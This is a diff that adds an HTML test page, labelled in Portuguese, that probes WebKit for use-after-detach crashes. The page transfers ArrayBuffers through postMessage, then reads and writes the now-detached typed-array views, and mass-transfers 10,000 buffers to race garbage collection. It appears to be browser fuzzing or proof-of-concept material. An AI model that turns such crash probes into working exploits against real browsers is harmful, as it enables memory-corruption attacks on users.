@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>TEST 02 - ArrayBuffer Detach via postMessage</title>
+</head>
+<body>
+
+<h2>TEST 02 - ArrayBuffer Detach Loop</h2>
+<p>Alvo: use-after-detach / crash via transferencia de ArrayBuffer pelo postMessage</p>
+<p>API: postMessage, ArrayBuffer (transferable), Uint8Array</p>
+<p>Tecnica: transferir buffer torna view anterior um "detached buffer" - acesso subsequente = crash potencial</p>
+
+<pre id="log">Aguardando inicio...</pre>
+<button onclick="startTest()">INICIAR TESTE</button>
+
+<script>
+var log = document.getElementById('log');
+
+function append(msg) {
+  log.textContent += '\n' + msg;
+}
+
+function startTest() {
+  append('[02] Iniciando teste de detach via postMessage...');
+
+  var rounds = 0;
+
+  // Phase 1: create view, transfer buffer, immediately access old view
+  function phaseOne() {
+    try {
+      var buf = new ArrayBuffer(1024 * 1024 * 64); // 64MB
+      var view = new Uint8Array(buf);
+      var view32 = new Uint32Array(buf);
+
+      // Fill with pattern before transfer
+      for (var i = 0; i < 1024; i++) {
+        view[i] = (i & 0xFF);
+      }
+
+      // Transfer ownership - buf is now detached from view and view32
+      postMessage("transfer", "*", [buf]);
+
+      // Access AFTER transfer - buf.byteLength should be 0
+      append('[02] buf.byteLength apos transfer: ' + buf.byteLength);
+      append('[02] view.length apos detach: ' + view.length);
+
+      // Attempt to read detached buffer via old view - UB in some WebKit versions
+      var sum = 0;
+      for (var j = 0; j < 64; j++) {
+        sum += view[j]; // Access detached Uint8Array
+      }
+      append('[02] Leitura de view detachado: sum=' + sum);
+
+      // Attempt write to detached buffer
+      view32[0] = 0xDEADBEEF;
+      append('[02] Escrita em view32 detachado: ' + view32[0]);
+
+      rounds++;
+      if (rounds < 500) {
+        setTimeout(phaseOne, 10);
+      } else {
+        append('[02] 500 rounds completos. Testando spray em paralelo...');
+        phaseTwo();
+      }
+    } catch(e) {
+      append('[02] EXCECAO em round ' + rounds + ': ' + e.message);
+    }
+  }
+
+  // Phase 2: rapid fire transfers trying to create race with GC
+  function phaseTwo() {
+    var pending = [];
+
+    try {
+      for (var i = 0; i < 10000; i++) {
+        var b = new ArrayBuffer(65536);
+        var v = new Uint32Array(b);
+        v[0] = i;
+        pending.push({view: v, buf: b});
+      }
+
+      // Transfer all simultaneously
+      for (var k = 0; k < pending.length; k++) {
+        postMessage("t", "*", [pending[k].buf]);
+      }
+
+      // Access all old views immediately after mass transfer
+      var total = 0;
+      for (var m = 0; m < pending.length; m++) {
+        total += pending[m].view[0]; // All detached - racing GC
+      }
+      append('[02] Phase 2 total (detached views sum): ' + total);
+
+    } catch(e) {
+      append('[02] Phase 2 excecao: ' + e.message);
+    }
+  }
+
+  phaseOne();
+}
+</script>
+
+</body>
+</html>
